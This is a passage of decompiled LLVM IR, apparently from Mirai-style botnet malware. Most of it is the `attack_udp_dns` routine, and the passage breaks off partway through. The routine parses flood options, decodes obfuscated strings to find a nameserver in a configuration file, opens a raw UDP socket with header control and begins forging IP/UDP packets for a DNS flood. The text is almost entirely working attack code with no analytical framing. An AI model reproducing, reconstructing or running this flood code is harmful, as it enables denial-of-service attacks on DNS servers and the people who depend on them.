  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v6_c228 = sdiv i32 %sext22, 16777216
  %v7_c228 = inttoptr i32 %v0_c220 to i32*
  %v8_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v7_c228, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v8_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v6_c284 = inttoptr i32 %v0_c27c to i32*
  %v7_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v6_c284, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v7_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v6_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v7_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v6_c2b8, i32 9, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v7_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 26)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 26, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_c308 = call i32 @__libc_open(i32 %v3_c300, i32 0)
  store i32 %v2_c308, i32* @r4, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 26)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 27)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 27, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
  %v4_c364 = call i32 @util_stristr(i8* %v3_c364, i32 %v0_c358, i32 %v3_c354)
  store i32 %v4_c364, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_c370 = call i32 @table_lock_val(i32 27)
  store i32 %v1_c370, i32* %r0.global-to-local, align 4
  %v0_c374 = load i32, i32* @r6, align 4
  %v7_c374 = icmp eq i32 %v0_c374, -1
  store i1 %v7_c374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c374, label %dec_label_pc_c814, label %dec_label_pc_c37c

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c320
  %v0_c37c = load i32, i32* @r5, align 4
  %v9_c37c = icmp eq i32 %v0_c37c, %v0_c374
  store i1 %v9_c37c, i1* %cpsr_z.global-to-local, align 1
  %v7_c380 = icmp sgt i32 %v0_c37c, %v0_c374
  br i1 %v7_c380, label %dec_label_pc_c384, label %dec_label_pc_c814

dec_label_pc_c384:                                ; preds = %dec_label_pc_c37c
  %v0_c384 = load i32, i32* @sl, align 4
  %v2_c384 = add i32 %v0_c384, %v0_c374
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v0_c374, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_c3b0 = add i32 %v0_c37c, -1
  br label %dec_label_pc_c3a8

dec_label_pc_c394:                                ; preds = %dec_label_pc_c3d0, %bb104
  %v9_c394 = icmp eq i32 %v1_c3b0, %v0_c39c
  store i1 %v9_c394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c394, label %dec_label_pc_c3e0, label %dec_label_pc_c39c

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c3c0, %dec_label_pc_c394, %bb
  %v0_c3cc29 = phi i32 [ %v0_c3cc, %dec_label_pc_c3c0 ], [ %v0_c3cc30, %dec_label_pc_c394 ], [ %v0_c3cc, %bb ]
  %v0_c3ac25 = phi i32 [ 0, %dec_label_pc_c3c0 ], [ %v0_c3ac26, %dec_label_pc_c394 ], [ 0, %bb ]
  %v1_c39c = add i32 %v0_c39c, 1
  store i32 %v1_c39c, i32* %r2.global-to-local, align 4
  %v9_c3a0 = icmp eq i32 %v1_c39c, %v0_c37c
  store i1 %v9_c3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c3a0, label %dec_label_pc_c814, label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c384
  %v0_c39c = phi i32 [ %v1_c39c, %dec_label_pc_c39c ], [ %v0_c374, %dec_label_pc_c384 ]
  %v0_c3cc = phi i32 [ %v0_c3cc29, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3ac = phi i32 [ %v0_c3ac25, %dec_label_pc_c39c ], [ 0, %dec_label_pc_c384 ]
  %v0_c3b4 = phi i32 [ %v1_c3b4, %dec_label_pc_c39c ], [ %v2_c384, %dec_label_pc_c384 ]
  %v1_c3a8 = inttoptr i32 %v0_c3b4 to i8*
  %v2_c3a8 = load i8, i8* %v1_c3a8, align 1
  %v3_c3a8 = zext i8 %v2_c3a8 to i32
  store i32 %v3_c3a8, i32* %r3.global-to-local, align 4
  %v2_c3ac = icmp eq i32 %v0_c3ac, 0
  store i1 %v2_c3ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c3b0, i32* @r4, align 4
  %v1_c3b4 = add i32 %v0_c3b4, 1
  store i32 %v1_c3b4, i32* %r1.global-to-local, align 4
  %v1_c3b8 = add nsw i32 %v3_c3a8, -48
  store i32 %v1_c3b8, i32* %r0.global-to-local, align 4
  br i1 %v2_c3ac, label %dec_label_pc_c3c0, label %dec_label_pc_c3d0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3a8
  %v7_c3c0 = icmp eq i8 %v2_c3a8, 9
  store i1 %v7_c3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3c0, label %dec_label_pc_c39c, label %bb

bb:                                               ; preds = %dec_label_pc_c3c0
  %v8_c3c4 = icmp eq i8 %v2_c3a8, 32
  store i1 %v8_c3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c3c4, label %dec_label_pc_c39c, label %dec_label_pc_c3cc

dec_label_pc_c3cc:                                ; preds = %bb
  %v1_c3cc = add i32 %v0_c3cc, 1
  store i32 %v1_c3cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_c3d0

dec_label_pc_c3d0:                                ; preds = %dec_label_pc_c3a8, %dec_label_pc_c3cc
  %v0_c3cc30 = phi i32 [ %v0_c3cc, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v0_c3ac26 = phi i32 [ %v0_c3ac, %dec_label_pc_c3a8 ], [ %v1_c3cc, %dec_label_pc_c3cc ]
  %v7_c3d0 = icmp eq i8 %v2_c3a8, 46
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c394, label %bb104

bb104:                                            ; preds = %dec_label_pc_c3d0
  %v8_c3d4 = icmp eq i32 %v1_c3b8, 9
  store i1 %v8_c3d4, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_c3b8, 10
  br i1 %tmp, label %dec_label_pc_c394, label %dec_label_pc_c3dc

dec_label_pc_c3dc:                                ; preds = %bb104
  br label %dec_label_pc_c3e0

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c3dc
  %v0_c39c127 = phi i32 [ %v0_c39c, %dec_label_pc_c3dc ], [ %v1_c3b0, %dec_label_pc_c394 ]
  %v2_c3e4 = sub i32 %v0_c39c127, %v0_c374
  store i32 %v2_c3e4, i32* @r4, align 4
  %v2_c3e8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_c384, i32* %r1.global-to-local, align 4
  store i32 %v2_c3e8, i32* %r0.global-to-local, align 4
  store i32 %v2_c3e4, i32* %r2.global-to-local, align 4
  %v3_c3f8 = call i32 @util_memcpy(i32 %v2_c3e8, i32 %v2_c384, i32 %v2_c3e4)
  %v2_c3fc = ptrtoint i32* %stack_var_-40 to i32
  %v1_c400 = load i32, i32* @r4, align 4
  %v2_c400 = add i32 %v1_c400, %v2_c3fc
  store i32 %v2_c400, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c3e8, i32* @r0, align 4
  %v3_c40c = add i32 %v2_c400, -36
  %v4_c40c = inttoptr i32 %v3_c40c to i8*
  store i8 0, i8* %v4_c40c, align 1
  %v1_c410 = call i32 @inet_addr(i32 %v2_c3e8)
  store i32 %v1_c410, i32* %r0.global-to-local, align 4
  store i32 %v1_c410, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c4189:                               ; preds = %dec_label_pc_c814
  unreachable

dec_label_pc_c418:                                ; preds = %dec_label_pc_c874, %dec_label_pc_c86c, %dec_label_pc_c860, %dec_label_pc_c850, %dec_label_pc_c3e0
  %v1_c84c50 = phi i32 [ %v1_c818, %dec_label_pc_c874 ], [ %v1_c818, %dec_label_pc_c86c ], [ %v1_c818, %dec_label_pc_c860 ], [ %v1_c818, %dec_label_pc_c850 ], [ %v1_c410, %dec_label_pc_c3e0 ]
  %v0_c418 = load i32, i32* @r7, align 4
  %v2_c418 = icmp eq i32 %v0_c418, 0
  store i1 %v2_c418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c418, label %dec_label_pc_c840, label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_c418
  store i32 %v0_c418, i32* %r0.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v0_c418 to i8*
  %v2_c424 = call i32 @util_strlen(i8* %v1_c424)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_c424, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c438 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v7_c43c = icmp eq i32 %v3_c438, -1
  store i1 %v7_c43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c43c, label %dec_label_pc_c840, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %dec_label_pc_c420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c450 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c450, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c464 = call i32 @__GI_setsockopt(i32 %v3_c438, i32 0, i32 3, i32 %v6_c450, i32 4)
  store i32 %v5_c464, i32* %r0.global-to-local, align 4
  %v7_c468 = icmp eq i32 %v5_c464, -1
  store i1 %v7_c468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c468, label %dec_label_pc_c838, label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %dec_label_pc_c448
  %v0_c478 = load i32, i32* %sb.global-to-local, align 4
  %v1_c478 = urem i32 %v0_c478, 256
  store i32 %v1_c478, i32* %sb.global-to-local, align 4
  %v3_c480 = mul i32 %v7_c284, 65536
  store i32 %v3_c480, i32* %r3.global-to-local, align 4
  %v5_c48c = trunc i32 %v0_c478 to i8
  %v0_c490 = load i32, i32* @r8, align 4
  %v2_c490 = icmp eq i32 %v0_c490, 0
  store i1 %v2_c490, i1* %cpsr_z.global-to-local, align 1
  %v3_c494 = urem i32 %v8_c228, 65536
  store i32 %v3_c494, i32* %r0.global-to-local, align 4
  %v3_c49c = urem i32 %v7_c284, 65536
  store i32 %v3_c49c, i32* %r2.global-to-local, align 4
  %v3_c4a0 = mul i32 %v6_c29c, 65536
  %v3_c4a4 = mul i32 %v7_c2b8, 65536
  store i32 %v3_c4a4, i32* %ip.global-to-local, align 4
  br i1 %v2_c490, label %bb105, label %bb106

bb105:                                            ; preds = %dec_label_pc_c470
  %v5_c4ac = sext i8 %v5_c48c to i32
  store i32 %v5_c4ac, i32* %r2.global-to-local, align 4
  br label %bb106

bb106:                                            ; preds = %dec_label_pc_c470, %bb105
  %v2_c4d8 = phi i32 [ %v3_c49c, %dec_label_pc_c470 ], [ %v5_c4ac, %bb105 ]
  %v3_c4b8 = urem i32 %v6_c29c, 65536
  store i32 %v3_c4b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_c4c0 = urem i32 %v7_c2b8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_c4d8 = load i32, i32* @r6, align 4
  br i1 %v2_c490, label %.dec_label_pc_c6c0.preheader_crit_edge, label %dec_label_pc_c4e0

.dec_label_pc_c6c0.preheader_crit_edge:           ; preds = %bb106
  %v3_c4d8 = add i32 %v1_c4d8, %v2_c4d8
  store i32 %v3_c4d8, i32* @r7, align 4
  %.pre = sext i8 %v5_c48c to i32
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c4e0:                                ; preds = %bb106
  %v2_c4e0 = add i32 %v1_c4d8, %v1_c478
  %v3_c4e4 = mul i32 %v2_c4e0, 65536
  %v1_c4ec = add i32 %v3_c4e4, 1769472
  %v1_c4f0 = add i32 %v3_c4e4, 3080192
  %tmp107 = udiv i32 %v1_c4f0, 256
  %v3_c504 = and i32 %tmp107, 65280
  %v4_c514 = udiv i32 %v1_c4f0, 16777216
  %v5_c514 = or i32 %v3_c504, %v4_c514
  store i32 %v5_c514, i32* @sl, align 4
  %trunc61 = trunc i32 %v7_c284 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc61)
  %tmp108 = mul i32 %v8_c228, 256
  %v3_c528 = and i32 %tmp108, 65280
  store i32 %v3_c528, i32* %r1.global-to-local, align 4
  %tmp109 = udiv i32 %v8_c228, 256
  %v4_c52c = urem i32 %tmp109, 256
  %v5_c52c = or i32 %v4_c52c, %v3_c528
  store i32 %v5_c52c, i32* @sb, align 4
  store i32 %v3_c4a4, i32* %r2.global-to-local, align 4
  store i32 %v3_c4a0, i32* %r0.global-to-local, align 4
  %tmp110 = mul i32 %v6_c29c, 256
  %v3_c540 = and i32 %tmp110, 65280
  %tmp111 = mul i32 %v7_c2b8, 256
  %v3_c544 = and i32 %tmp111, 65280
  %tmp112 = udiv i32 %v1_c4ec, 256
  %v3_c548 = and i32 %tmp112, 65280
  store i32 %v3_c548, i32* @lr, align 4
  %tmp113 = udiv i32 %v6_c29c, 256
  %v4_c54c = urem i32 %tmp113, 256
  %v5_c54c = or i32 %v4_c54c, %v3_c540
  store i32 %v5_c54c, i32* %ip.global-to-local, align 4
  %tmp114 = udiv i32 %v7_c2b8, 256
  %v4_c550 = urem i32 %tmp114, 256
  %v5_c550 = or i32 %v4_c550, %v3_c544
  store i32 %v5_c550, i32* @r4, align 4
  %v1_c554 = add i32 %v1_c4d8, 1
  store i32 %v1_c554, i32* %r3.global-to-local, align 4
  %v4_c558 = udiv i32 %v1_c4ec, 16777216
  %v5_c558 = or i32 %v4_c558, %tmp112
  store i32 0, i32* @r5, align 4
  %v4_c5dc = sext i8 %v5_c48c to i32
  %sext = mul nuw i32 %v5_c54c, 65536
  %v7_c5f0 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_c550, 65536
  %v4_c618 = sdiv i32 %sext8, 65536
  %v1_c5b8 = trunc i32 %v6_c228 to i8
  %extract.t = trunc i32 %v5_c260 to i8
  %v1_c5e0 = add nsw i32 %v4_c5dc, 41
  %sext121 = mul i32 %v5_c558, 65536
  %v3_c5f0 = sdiv i32 %sext121, 65536
  br label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c690, %dec_label_pc_c4e0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_c578 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_c578, i32* %r0.global-to-local, align 4
  store i32 %v2_c1ec, i32* %ip.global-to-local, align 4
  %v3_c580 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c580, i32* %r3.global-to-local, align 4
  %v2_c584 = load i32, i32* @r5, align 4
  %v5_c584 = mul i32 %v2_c584, 4
  %v6_c584 = add i32 %v5_c584, %v2_c1ec
  %v7_c584 = inttoptr i32 %v6_c584 to i32*
  store i32 %v2_c578, i32* %v7_c584, align 4
  %v0_c588 = load i32, i32* %ip.global-to-local, align 4
  %v1_c588 = load i32, i32* %r3.global-to-local, align 4
  %v4_c588 = mul i32 %v1_c588, 4
  %v5_c588 = add i32 %v4_c588, %v0_c588
  %v6_c588 = inttoptr i32 %v5_c588 to i32*
  %v7_c588 = load i32, i32* %v6_c588, align 4
  store i32 %v7_c588, i32* %r1.global-to-local, align 4
  %v1_c58c = inttoptr i32 %v7_c588 to i8*
  %v2_c58c = load i8, i8* %v1_c58c, align 1
  %tmp132 = urem i8 %v2_c58c, 16
  %v1_c590 = zext i8 %tmp132 to i32
  %v1_c594 = or i32 %v1_c590, 64
  store i32 %v1_c594, i32* %r2.global-to-local, align 4
  %v1_c598 = trunc i32 %v1_c594 to i8
  store i8 %v1_c598, i8* %v1_c58c, align 1
  %v0_c59c = load i32, i32* %r1.global-to-local, align 4
  %v1_c59c = inttoptr i32 %v0_c59c to i8*
  %v2_c59c = load i8, i8* %v1_c59c, align 1
  %v3_c59c = zext i8 %v2_c59c to i32
  %v1_c5a0 = and i32 %v3_c59c, 240
  %v1_c5a4 = or i32 %v1_c5a0, 5
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c26c, i32* %lr.global-to-local, align 4
  %v1_c5ac = trunc i32 %v1_c5a4 to i8
  store i8 %v1_c5ac, i8* %v1_c59c, align 1
  store i32 %v6_c228, i32* %r0.global-to-local, align 4
  %v0_c5b4 = load i32, i32* %lr.global-to-local, align 4
  %v2_c5b4 = icmp eq i32 %v0_c5b4, 0
  store i1 %v2_c5b4, i1* %cpsr_z.global-to-local, align 1
  %v2_c5b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5b8 = add i32 %v2_c5b8, 1
  %v4_c5b8 = inttoptr i32 %v3_c5b8 to i8*
  store i8 %v1_c5b8, i8* %v4_c5b8, align 1
  store i32 %v5_c260, i32* %r2.global-to-local, align 4
  %v0_c5c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c5c0, label %.thread11, label %bb115

bb115:                                            ; preds = %dec_label_pc_c570
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_c5c4 = add i32 %v3_c5c4, 6
  %v5_c5c4 = inttoptr i32 %v4_c5c4 to i16*
  store i16 64, i16* %v5_c5c4, align 2
  %v0_c5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t53 = trunc i32 %v0_c5cc.pre to i8
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_c570, %bb115
  %v0_c5cc.off0 = phi i8 [ %extract.t, %dec_label_pc_c570 ], [ %extract.t53, %bb115 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_c5cc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5cc = add i32 %v2_c5cc, 8
  %v4_c5cc = inttoptr i32 %v3_c5cc to i8*
  store i8 %v0_c5cc.off0, i8* %v4_c5cc, align 1
  %v0_c5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c5d0 = trunc i32 %v0_c5d0 to i8
  %v2_c5d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c5d0 = add i32 %v2_c5d0, 9
  %v4_c5d0 = inttoptr i32 %v3_c5d0 to i8*
  store i8 %v1_c5d0, i8* %v4_c5d0, align 1
  %v2_c5d8 = load i32, i32* @global_var_24f10.62, align 4
  %v0_c5e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5e4 = add i32 %v1_c5e0, %v0_c5e0
  store i32 %v2_c5e4, i32* @r4, align 4
  %v2_c5e8 = add i32 %v0_c5e0, 12
  %v3_c5e8 = inttoptr i32 %v2_c5e8 to i32*
  store i32 %v2_c5d8, i32* %v3_c5e8, align 4
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  store i32 %v7_c5f0, i32* %r3.global-to-local, align 4
  %v0_c5f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c5f4, 20
  store i32 %v1_c5f4, i32* %ip.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @sl, align 4
  %v1_c5f8 = trunc i32 %v0_c5f8 to i16
  %v3_c5f8 = add i32 %v0_c5f4, 2
  %v4_c5f8 = inttoptr i32 %v3_c5f8 to i16*
  store i16 %v1_c5f8, i16* %v4_c5f8, align 2
  %v0_c5fc = load i32, i32* @sb, align 4
  %v1_c5fc = trunc i32 %v0_c5fc to i16
  %v2_c5fc = load i32, i32* %r1.global-to-local, align 4
  %v3_c5fc = add i32 %v2_c5fc, 4
  %v4_c5fc = inttoptr i32 %v3_c5fc to i16*
  store i16 %v1_c5fc, i16* %v4_c5fc, align 2
  %v0_c600 = load i32, i32* %r2.global-to-local, align 4
  %v1_c600 = trunc i32 %v0_c600 to i16
  %v2_c600 = load i32, i32* %ip.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 4
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v0_c604 = load i32, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i16
  %v2_c604 = load i32, i32* %ip.global-to-local, align 4
